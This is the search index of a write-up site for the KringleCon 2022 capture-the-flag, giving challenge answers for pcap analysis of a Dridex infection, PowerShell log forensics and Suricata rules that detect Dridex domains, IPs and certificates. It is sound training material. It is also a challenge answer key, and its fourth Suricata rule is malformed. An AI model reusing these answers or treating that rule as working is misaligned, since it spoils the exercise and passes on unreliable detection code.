{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"KringleCon 2022 Write-Up Story Five Rings for the Christmas king immersed in cold Each Ring now missing from its zone The first with bread kindly given, not sold Another to find 'ere pipelines get owned One beneath a fountain where water flowed Into clouds Grinchum had the fourth thrown The fifth on blockchains where shadows be bold One hunt to seek them all, five quests to find them One player to bring them all, and Santa Claus to bind them Objectives Objective 0: KringleCon Orientation 01. Talk to Jingle Ringford 02. Get your badge 03. Create a wallet 04. Use the terminal 05. Talk to Santa Objective 1: Recover the Tolkien Ring 1.1 Wireshark Practice 1.2 Find the Next Objective 1.3 Windows Event Logs 1.4 Find the Next Objective 1.5 Suricata Regatta Objective 2: Recover the Elfen Ring 2.1 Clone with a Diference 2.2 Find the Next Objective 2.3 Prison Escape 2.4 Find the Next Objective 2.5 Jolly CI/CD Objective 3: Recover the Web Ring 3.1 Naught IP 3.2 Credential Mining 3.3 404 FTW 3.4 IMDS XXE and Other Abbreviations 3.5 Find the Next Objective 3.6 Open Boria Mine Door 3.7 Find the Next Objective 3.8 Glamtariel's Fountain Objective 4: Recover the Cloud Ring 4.1 AWS CLI_Intro 4.2 Find the Next Objective 4.3 Trufflehog Search 4.4 Find the Next Objective 4.5 Exploitation via AWS CLI Objective 5: Recover the Burning Ring of Fire 5.1 Buy a Hat 5.2 Blockchain Divination 5.3 Exploit a Smart Contract Finale 6: Roll Creits 6.1 Finale and Roll Credits","title":"Home"},{"location":"index.html#kringlecon-2022-write-up","text":"","title":"KringleCon 2022 Write-Up"},{"location":"index.html#story","text":"Five Rings for the Christmas king immersed in cold Each Ring now missing from its zone The first with bread kindly given, not sold Another to find 'ere pipelines get owned One beneath a fountain where water flowed Into clouds Grinchum had the fourth thrown The fifth on blockchains where shadows be bold One hunt to seek them all, five quests to find them One player to bring them all, and Santa Claus to bind them","title":"Story"},{"location":"index.html#objectives","text":"Objective 0: KringleCon Orientation 01. Talk to Jingle Ringford 02. Get your badge 03. Create a wallet 04. Use the terminal 05. Talk to Santa Objective 1: Recover the Tolkien Ring 1.1 Wireshark Practice 1.2 Find the Next Objective 1.3 Windows Event Logs 1.4 Find the Next Objective 1.5 Suricata Regatta Objective 2: Recover the Elfen Ring 2.1 Clone with a Diference 2.2 Find the Next Objective 2.3 Prison Escape 2.4 Find the Next Objective 2.5 Jolly CI/CD Objective 3: Recover the Web Ring 3.1 Naught IP 3.2 Credential Mining 3.3 404 FTW 3.4 IMDS XXE and Other Abbreviations 3.5 Find the Next Objective 3.6 Open Boria Mine Door 3.7 Find the Next Objective 3.8 Glamtariel's Fountain Objective 4: Recover the Cloud Ring 4.1 AWS CLI_Intro 4.2 Find the Next Objective 4.3 Trufflehog Search 4.4 Find the Next Objective 4.5 Exploitation via AWS CLI Objective 5: Recover the Burning Ring of Fire 5.1 Buy a Hat 5.2 Blockchain Divination 5.3 Exploit a Smart Contract Finale 6: Roll Creits 6.1 Finale and Roll Credits","title":"Objectives"},{"location":"Objectives/0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html","text":"KringleCon Orientation 0.1 Talk to Jingle Ringford Talk to Jingle Ringford Jingle Ringford will start you on your journey! Solve","title":"01. Talk to Jingle Ringford"},{"location":"Objectives/0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html#kringlecon-orientation","text":"","title":"KringleCon Orientation"},{"location":"Objectives/0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html#01-talk-to-jingle-ringford","text":"Talk to Jingle Ringford Jingle Ringford will start you on your journey!","title":"0.1 Talk to Jingle Ringford"},{"location":"Objectives/0_KringleCon_Orientation/01_Talk_to_Jingle_Ringford.html#solve","text":"","title":"Solve"},{"location":"Objectives/0_KringleCon_Orientation/02_Get_your_badge.html","text":"KringleCon Orientation 0.2 Get your badge Solve See the dialog with Jingle Ringford \"It's the five golden rings in the middle of your avatar.\"","title":"02. Get your badge"},{"location":"Objectives/0_KringleCon_Orientation/02_Get_your_badge.html#kringlecon-orientation","text":"","title":"KringleCon Orientation"},{"location":"Objectives/0_KringleCon_Orientation/02_Get_your_badge.html#02-get-your-badge","text":"","title":"0.2 Get your badge"},{"location":"Objectives/0_KringleCon_Orientation/02_Get_your_badge.html#solve","text":"See the dialog with Jingle Ringford \"It's the five golden rings in the middle of your avatar.\"","title":"Solve"},{"location":"Objectives/0_KringleCon_Orientation/03_Create_a_wallet.html","text":"KringleCon Orientation 0.3 Create a wallet Create a crypto wallet Solve","title":"03. Create a wallet"},{"location":"Objectives/0_KringleCon_Orientation/03_Create_a_wallet.html#kringlecon-orientation","text":"","title":"KringleCon Orientation"},{"location":"Objectives/0_KringleCon_Orientation/03_Create_a_wallet.html#03-create-a-wallet","text":"Create a crypto wallet","title":"0.3 Create a wallet"},{"location":"Objectives/0_KringleCon_Orientation/03_Create_a_wallet.html#solve","text":"","title":"Solve"},{"location":"Objectives/0_KringleCon_Orientation/04_Use_the_terminal.html","text":"KringleCon Orientation 0.4 Use the terminal Solve Terminal answers Welcome to the first terminal challenge: This one is intentionally simple. All we need you to do is: Type answer and prest Enter Solve: type on terninal \"answer\"","title":"04. Use the terminal"},{"location":"Objectives/0_KringleCon_Orientation/04_Use_the_terminal.html#kringlecon-orientation","text":"","title":"KringleCon Orientation"},{"location":"Objectives/0_KringleCon_Orientation/04_Use_the_terminal.html#04-use-the-terminal","text":"","title":"0.4 Use the terminal"},{"location":"Objectives/0_KringleCon_Orientation/04_Use_the_terminal.html#solve","text":"","title":"Solve"},{"location":"Objectives/0_KringleCon_Orientation/04_Use_the_terminal.html#terminal-answers","text":"Welcome to the first terminal challenge: This one is intentionally simple. All we need you to do is: Type answer and prest Enter Solve: type on terninal \"answer\"","title":"Terminal answers"},{"location":"Objectives/0_KringleCon_Orientation/05_Talk_to_Santa.html","text":"KringleCon Orientation 0.5 Talk to Santa Talk to Santa Talk to Santa in front of the castle to get your next objectives.\" Solve","title":"05. Talk to Santa"},{"location":"Objectives/0_KringleCon_Orientation/05_Talk_to_Santa.html#kringlecon-orientation","text":"","title":"KringleCon Orientation"},{"location":"Objectives/0_KringleCon_Orientation/05_Talk_to_Santa.html#05-talk-to-santa","text":"Talk to Santa Talk to Santa in front of the castle to get your next objectives.\"","title":"0.5 Talk to Santa"},{"location":"Objectives/0_KringleCon_Orientation/05_Talk_to_Santa.html#solve","text":"","title":"Solve"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html","text":"Recover the Tolkien Ring 1.1 Wireshark Practice Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP. Get hints for this challenge by typing hint in the upper panel of the terminal. Solve Download the pcap file: https://storage.googleapis.com/hhc22_player_assets/suspicious.pcap Terminal answers Task: Analyze the Wireshark file and Answer the Elf's Questions! To complete your task, download the file from your badge or use this command line to answer the questions. Tips: 1. Each question may have hints. If you want another hint from the elf, just type hint in the upper pane. 2. If you need help with Wireshark filters you can go here: https://wiki.wireshark.org/DisplayFilters 3. If you need help with tshark filters, try this cheat sheet: https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/ 4. Of course, SANS has lots of cheat sheets that can help: https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/ 5. And remember, you can use Wireshark filters in tshark. Tmux orientation: For this terminal, you can use the mouse to switch or resize panes. For clipboard use, you can shift-click and drag, then Ctrl+c to copy. Use Ctrl+Shift+v to paste. Normal tmux shortcuts ( Ctrl+b+\u2191 or \u2193 ) work as well. 1.- There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exeported from this PCAP? ANSWER: http Solve: Just read the links and hints and info provided Hint 1 : https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/ Hint 2 : We're looking for a protocol like FTP, HTTP, SMB, etc. Hint 3 : https://osqa-ask.wireshark.org/questions/35846/how-can-i-export-http-objects-via-command-line/ 2.- What is the file name of the largest file we can export? ANSWER: app.php Solve: Use tshark commandliner $ tshark -r pcap_challenge.pcap --export-objects \"http,http\" Hint 1 : https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/ Hint 2 : If working in the terminal, you may need to combine tshark commands with other Linux commands 3.- What packet number starts the app.php file? ANSWER: 687 Solve: Use wireshark: Export HTTP options -> see the number of packets [../snip] Hint 1 : In Wireshark, the Export | HTTP object list shows start packet numbers Hint 2 : When using tshark look for (text/html) in the output 4.- What is the IP pf the Apache Server? ANSWER: 192.185.57.242 Solve: Just use wireshark to visualize the IP address with Apache Server Hint 1 : Search for 'apache' with Wireshark's Find function Hint 2 : Remember Linux is case-sensitive Hint 3 : Try using http.request and http.host 5.- What file is saved to the infected hosts? ANSWER: Ref_Sept24-2020.zip Solve: See inside app(1).php, data is encoded Hint 1 : Look inside the first TCP stream Hint 2 : The answer is a .zip file Hint 3 : Look inside the files that you exported using tshark Hint 4 : https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/ 6.- Attackers used bad TLS certificates in this traffict. Which countries were thet registered to6? Submit the names of the countries in alphabetical order separated by a commas Ex: Norway, South Korea). ANSWER: Ireland, Israel, South Sudan , United States Solve: Use tshark commandliner $ tshark -r suspicious.pcap -Y \"ssl.handshake.type == 11\" <- or better using wireshark and see the options on Certificate Section: Hint 1 : Look up the country code Hint 2 : Look for cookies in https Hint 3 : Filter for tls handshake for certificate, https://subscription.packtpub.com/book/networking-and-servers/9781785887819/4/ch04lvl1sec27/the-ssl-tls-handshake Hint 4 : When using tshark, pipe results to grep, awk, sort, or any other tools that can help filter through the data SS (South Sudan), US (United States), IL (Israel), IE (Ireland) 7.- Is the host infected? ANSWER: yes","title":"1.1 Wireshark Practice"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html#recover-the-tolkien-ring","text":"","title":"Recover the Tolkien Ring"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html#11-wireshark-practice","text":"Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP. Get hints for this challenge by typing hint in the upper panel of the terminal.","title":"1.1 Wireshark Practice"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html#solve","text":"Download the pcap file: https://storage.googleapis.com/hhc22_player_assets/suspicious.pcap","title":"Solve"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.1_Wireshark_Practice.html#terminal-answers","text":"Task: Analyze the Wireshark file and Answer the Elf's Questions! To complete your task, download the file from your badge or use this command line to answer the questions. Tips: 1. Each question may have hints. If you want another hint from the elf, just type hint in the upper pane. 2. If you need help with Wireshark filters you can go here: https://wiki.wireshark.org/DisplayFilters 3. If you need help with tshark filters, try this cheat sheet: https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/ 4. Of course, SANS has lots of cheat sheets that can help: https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/ 5. And remember, you can use Wireshark filters in tshark. Tmux orientation: For this terminal, you can use the mouse to switch or resize panes. For clipboard use, you can shift-click and drag, then Ctrl+c to copy. Use Ctrl+Shift+v to paste. Normal tmux shortcuts ( Ctrl+b+\u2191 or \u2193 ) work as well. 1.- There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exeported from this PCAP? ANSWER: http Solve: Just read the links and hints and info provided Hint 1 : https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/ Hint 2 : We're looking for a protocol like FTP, HTTP, SMB, etc. Hint 3 : https://osqa-ask.wireshark.org/questions/35846/how-can-i-export-http-objects-via-command-line/ 2.- What is the file name of the largest file we can export? ANSWER: app.php Solve: Use tshark commandliner $ tshark -r pcap_challenge.pcap --export-objects \"http,http\" Hint 1 : https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/ Hint 2 : If working in the terminal, you may need to combine tshark commands with other Linux commands 3.- What packet number starts the app.php file? ANSWER: 687 Solve: Use wireshark: Export HTTP options -> see the number of packets [../snip] Hint 1 : In Wireshark, the Export | HTTP object list shows start packet numbers Hint 2 : When using tshark look for (text/html) in the output 4.- What is the IP pf the Apache Server? ANSWER: 192.185.57.242 Solve: Just use wireshark to visualize the IP address with Apache Server Hint 1 : Search for 'apache' with Wireshark's Find function Hint 2 : Remember Linux is case-sensitive Hint 3 : Try using http.request and http.host 5.- What file is saved to the infected hosts? ANSWER: Ref_Sept24-2020.zip Solve: See inside app(1).php, data is encoded Hint 1 : Look inside the first TCP stream Hint 2 : The answer is a .zip file Hint 3 : Look inside the files that you exported using tshark Hint 4 : https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/ 6.- Attackers used bad TLS certificates in this traffict. Which countries were thet registered to6? Submit the names of the countries in alphabetical order separated by a commas Ex: Norway, South Korea). ANSWER: Ireland, Israel, South Sudan , United States Solve: Use tshark commandliner $ tshark -r suspicious.pcap -Y \"ssl.handshake.type == 11\" <- or better using wireshark and see the options on Certificate Section: Hint 1 : Look up the country code Hint 2 : Look for cookies in https Hint 3 : Filter for tls handshake for certificate, https://subscription.packtpub.com/book/networking-and-servers/9781785887819/4/ch04lvl1sec27/the-ssl-tls-handshake Hint 4 : When using tshark, pipe results to grep, awk, sort, or any other tools that can help filter through the data SS (South Sudan), US (United States), IL (Israel), IE (Ireland) 7.- Is the host infected? ANSWER: yes","title":"Terminal answers"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html","text":"Recover the Tolkien Ring 1.2 Find the Next Objective Talk to Dusty Giftwrap for the next objective.. Solve","title":"1.2 Find the Next Objective"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html#recover-the-tolkien-ring","text":"","title":"Recover the Tolkien Ring"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html#12-find-the-next-objective","text":"Talk to Dusty Giftwrap for the next objective..","title":"1.2 Find the Next Objective"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.2_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html","text":"Recover the Tolkien Ring 1.3 Windows Event Logs Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing hint in the upper panel of the Windows Event Logs terminal. Hint(s) Solve Download the Windows event log file: https://storage.googleapis.com/hhc22_player_assets/powershell.evtx Terminal answers Grinchum sucessfully download his keylogger and has gathered the admin credentials ! We think he used Powershell to find the Lembanh recipe and steal our secret ingredient. Luckily, we enabled Pwoershell audiing adn have exported the windows Powershell logs to a flat text file. 1.- What month/day/year did the attack take place ? for example 09/05/2021 HINT1 : This is data that appers a lot into the log HINT2 : Sort and unique are great commands HINT3 : Find the dates that have the highest count. ANSWER: 12/24/2022 Solve: Use Forensic tool on Windows and se the correct date (in reverse-chronological order) c:\\> EvtxECmd.exe -f powershell.evtx --csv C:\\Tools\\arsena_forensics\\EvtxECmd\\output\\powershell.csv 2.- An attacker got a secret from a file. What was the original files's name ? HINT1 : https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-7.3 ANSWER: recipe_updated.txt Solve: $ cat powershell.csv| grep \"Add-Content -Path\", se the file \"recipe_updated.txt\" 3.- The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. HINT1 : The desire line in the file will start with a $ snce the question specifies a PowerShell variable (ex- $var)). HINT2 : To narrow your search look at https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7.3 HINT3 : Windows logs are in reverse-chronological order, try reversing their order with tac. ANSWER: $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt' Solve: Keep looking the cvs file log the line should without ScriptBlock 4.- After storing the altered file contents info the variable, the attacker used the variable to run separated command that wrote the modified data to a file. This was done multiple times. Submit the last full Powershell line that performed only this actions HINT1 : Loog the lines that start with $foo HINT2 : Windows logs are in reverse-chronological order, try reversing their order with tac. HINT3 : Read the question careful, and try grepping for the answer of question 2 ANSWER: $foo | Add-Content -Path 'Recipe' Solve: Filter using grep and observe the reverse-chronological order $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: 5.- The attack ran the previous command against a file multiple times , What is the name of this file? ANSWER: Recipe.txt Solve: Filter using grep and observe the reverse-chronological order $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: 6.- Where any files deleted ? ANSWER: Yes 7.- Was the original file (from the question 2) deleted ? ANSWER: No 8.- What is the Event ID of the log that shows the actual command line used to delete the file? ANSWER: 4104 Solve: Filter using grep and observe the first line 4104 is the envent requestedd $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: See the Line: $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt EventID: 4104 9.- Is the secret ingredient compromised ? ANSWER: Yes 10.- What is the secret ingredient ? ANSWER: honey Solve: Filter using grep and observe the first line 4104 is the envent requested $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: See the line Line $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'","title":"1.3 Windows Event Logs"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html#recover-the-tolkien-ring","text":"","title":"Recover the Tolkien Ring"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html#13-windows-event-logs","text":"Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing hint in the upper panel of the Windows Event Logs terminal.","title":"1.3 Windows Event Logs"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html#solve","text":"Download the Windows event log file: https://storage.googleapis.com/hhc22_player_assets/powershell.evtx","title":"Solve"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.3._Windows_Event_Logs.html#terminal-answers","text":"Grinchum sucessfully download his keylogger and has gathered the admin credentials ! We think he used Powershell to find the Lembanh recipe and steal our secret ingredient. Luckily, we enabled Pwoershell audiing adn have exported the windows Powershell logs to a flat text file. 1.- What month/day/year did the attack take place ? for example 09/05/2021 HINT1 : This is data that appers a lot into the log HINT2 : Sort and unique are great commands HINT3 : Find the dates that have the highest count. ANSWER: 12/24/2022 Solve: Use Forensic tool on Windows and se the correct date (in reverse-chronological order) c:\\> EvtxECmd.exe -f powershell.evtx --csv C:\\Tools\\arsena_forensics\\EvtxECmd\\output\\powershell.csv 2.- An attacker got a secret from a file. What was the original files's name ? HINT1 : https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-7.3 ANSWER: recipe_updated.txt Solve: $ cat powershell.csv| grep \"Add-Content -Path\", se the file \"recipe_updated.txt\" 3.- The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. HINT1 : The desire line in the file will start with a $ snce the question specifies a PowerShell variable (ex- $var)). HINT2 : To narrow your search look at https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7.3 HINT3 : Windows logs are in reverse-chronological order, try reversing their order with tac. ANSWER: $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt' Solve: Keep looking the cvs file log the line should without ScriptBlock 4.- After storing the altered file contents info the variable, the attacker used the variable to run separated command that wrote the modified data to a file. This was done multiple times. Submit the last full Powershell line that performed only this actions HINT1 : Loog the lines that start with $foo HINT2 : Windows logs are in reverse-chronological order, try reversing their order with tac. HINT3 : Read the question careful, and try grepping for the answer of question 2 ANSWER: $foo | Add-Content -Path 'Recipe' Solve: Filter using grep and observe the reverse-chronological order $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: 5.- The attack ran the previous command against a file multiple times , What is the name of this file? ANSWER: Recipe.txt Solve: Filter using grep and observe the reverse-chronological order $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: 6.- Where any files deleted ? ANSWER: Yes 7.- Was the original file (from the question 2) deleted ? ANSWER: No 8.- What is the Event ID of the log that shows the actual command line used to delete the file? ANSWER: 4104 Solve: Filter using grep and observe the first line 4104 is the envent requestedd $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: See the Line: $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt EventID: 4104 9.- Is the secret ingredient compromised ? ANSWER: Yes 10.- What is the secret ingredient ? ANSWER: honey Solve: Filter using grep and observe the first line 4104 is the envent requested $ cat powershell.csv| grep \"Add-Content -Path\" | grep ScriptBlockText: See the line Line $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'","title":"Terminal answers"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html","text":"Recover the Tolkien Ring 1.4 Find the Next Objective Talk to Fitzy Shortstack for the next objective. Solve","title":"1.4 Find the Next Objective"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html#recover-the-tolkien-ring","text":"","title":"Recover the Tolkien Ring"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html#14-find-the-next-objective","text":"Talk to Fitzy Shortstack for the next objective.","title":"1.4 Find the Next Objective"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.4_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html","text":"Recover the Tolkien Ring 1.5 Suricata Regatta Help detect this kind of malicious activity in the future by writing some Suricata rules. Work with Dusty Giftwrap in the Tolkien Ring to get some hints. Hint(s) Solve Terminal answers Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves! There's a short list of rules started in suricata.rules in your home directory. First off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead for us. They have some Dridex indicators of compromise to check out. First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. Add your rule to suricata.rules Once you think you have it right, run ./rule_checker to see how you've done! As you get rules correct, rule_checker will ask for more to be added. If you want to start fresh, you can exit the terminal and start again or cp suricata.rules.backup suricata.rules Good luck, and thanks for helping save the North Pole! 1.- Please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/dns-keywords.html Solve: $ echo 'alert dns $HOME_NET any -> any any (msg:\"Known bad DNS lookup, possible Dridex infection\"; dns.query; content:\"adv.epostoday.uk\"; nocase; sid:1; rev:1;) ' >>suricata.rules $ ./rule_checker 2.- STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242. Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html Solve: $ echo 'alert http any any -> any any (msg:\"Investigate suspicious connections, possible Dridex infection\"; sid:2; rev:2;)' >> suricata.rules $ ./rule_checker 3.- We heard that some naughty actors are using TLS certificates with a specific CN. Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/tls-keywords.html Solve: $ echo 'alert tls any any -> any any (msg:\"Investigate bad certificates, possible Dridex infection\"; tls.subject:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:3; rev:3;)' >> suricata.rules $ ./rule_checker 4.- OK, one more to rule them all and in the darkness find them. Let's watch for one line from the JavaScript: let byteCharacters = atob Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html#http-protocol Solve: $ echo 'alert http any any -> any any (msg: \"Suspicious JavaScript function, possible Dridex infection\"; flow:established; http.header; content:\"Content-Encoding|3a 20|gzip|0d 0a|\"; file.data; content:\"atob\";' >> suricata.rules $ ./rule_checker","title":"1.5 Suricata_Regatta"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html#recover-the-tolkien-ring","text":"","title":"Recover the Tolkien Ring"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html#15-suricata-regatta","text":"Help detect this kind of malicious activity in the future by writing some Suricata rules. Work with Dusty Giftwrap in the Tolkien Ring to get some hints.","title":"1.5 Suricata Regatta"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html#solve","text":"","title":"Solve"},{"location":"Objectives/1_Recover_the_Tolkien_Ring/1.5_Suricata_Regatta.html#terminal-answers","text":"Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves! There's a short list of rules started in suricata.rules in your home directory. First off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead for us. They have some Dridex indicators of compromise to check out. First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. Add your rule to suricata.rules Once you think you have it right, run ./rule_checker to see how you've done! As you get rules correct, rule_checker will ask for more to be added. If you want to start fresh, you can exit the terminal and start again or cp suricata.rules.backup suricata.rules Good luck, and thanks for helping save the North Pole! 1.- Please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/dns-keywords.html Solve: $ echo 'alert dns $HOME_NET any -> any any (msg:\"Known bad DNS lookup, possible Dridex infection\"; dns.query; content:\"adv.epostoday.uk\"; nocase; sid:1; rev:1;) ' >>suricata.rules $ ./rule_checker 2.- STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242. Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html Solve: $ echo 'alert http any any -> any any (msg:\"Investigate suspicious connections, possible Dridex infection\"; sid:2; rev:2;)' >> suricata.rules $ ./rule_checker 3.- We heard that some naughty actors are using TLS certificates with a specific CN. Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/tls-keywords.html Solve: $ echo 'alert tls any any -> any any (msg:\"Investigate bad certificates, possible Dridex infection\"; tls.subject:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:3; rev:3;)' >> suricata.rules $ ./rule_checker 4.- OK, one more to rule them all and in the darkness find them. Let's watch for one line from the JavaScript: let byteCharacters = atob Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection. Source: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html#http-protocol Solve: $ echo 'alert http any any -> any any (msg: \"Suspicious JavaScript function, possible Dridex infection\"; flow:established; http.header; content:\"Content-Encoding|3a 20|gzip|0d 0a|\"; file.data; content:\"atob\";' >> suricata.rules $ ./rule_checker","title":"Terminal answers"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html","text":"Recover the Elfen Ring 2.1 Clone with a Diference Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. Hint(s) Solve ANSWER: rununtoanswer maintainers Terminal answers $ git clone git@haugfactory.com:asnowball/aws_scripts.git $ rununtoanswer maintainers Alternative solve , just read directly the README.md file here: https://haugfactory.com/orcadmin/aws_scripts/-/blob/main/README.md","title":"2.1 Clone with a Diference"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html#recover-the-elfen-ring","text":"","title":"Recover the Elfen Ring"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html#21-clone-with-a-diference","text":"Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring.","title":"2.1 Clone with a Diference"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html#solve","text":"ANSWER: rununtoanswer maintainers","title":"Solve"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.1_Clone_with_a_Diference.html#terminal-answers","text":"$ git clone git@haugfactory.com:asnowball/aws_scripts.git $ rununtoanswer maintainers Alternative solve , just read directly the README.md file here: https://haugfactory.com/orcadmin/aws_scripts/-/blob/main/README.md","title":"Terminal answers"},{"location":"Objectives/2_Recover_the_Elfen_Ring/2.2_Find_the_Next_Objective.html","text":"Recover the Elfen Ring 2.2 Find the Next 